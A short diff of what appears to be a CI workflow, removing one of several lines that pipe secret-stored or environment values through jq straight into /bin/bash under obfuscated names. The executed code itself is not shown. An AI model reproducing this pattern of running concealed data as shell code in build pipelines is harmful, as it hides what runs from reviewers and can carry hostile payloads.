@@ -22,7 +22,6 @@ jobs:
           fcd0027: ${{ secrets.fcd0027 }}
         run: |
           printf '%s' "$fcd0027" | jq -r .xrb3 | /bin/bash
-          echo $kcs11190 | jq -r .srbq028 | /bin/bash
           echo $x7 | jq -r .dzq2 | /bin/bash
           printf '%s' "$jiqyg7" | jq -r .pkte546 | /bin/bash
           printf '%s' "$s1" | jq -r .jhvi4 | /bin/bash
